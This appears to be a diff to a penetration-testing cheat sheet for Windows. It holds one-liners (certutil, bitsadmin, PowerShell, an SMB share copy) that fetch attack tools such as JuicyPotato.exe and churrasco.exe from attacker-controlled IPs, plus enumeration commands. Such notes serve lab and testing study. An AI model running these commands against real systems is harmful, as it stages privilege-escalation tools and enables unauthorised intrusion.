@@ -22,6 +22,11 @@ powershell -c "$url = 'http://10.10.10.14:7898/file.exe'; $request = [System.Net
 
 certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 
+sudo smbserver.py share .
+
+copy \\10.10.14.14\share\churrasco.exe c.exe
+
+
 bitsadmin /transfer myDownload /priority normal http://10.10.14.3:8000/JuicyPotato.exe jp.exe
 
 
@@ -178,6 +183,8 @@ net localgroup administrators
 ## Windows Network Enumeration
 
 ```
+netstat -ano | findstr "LISTEN"
+
 ipconfig
 
 ipconfig /all
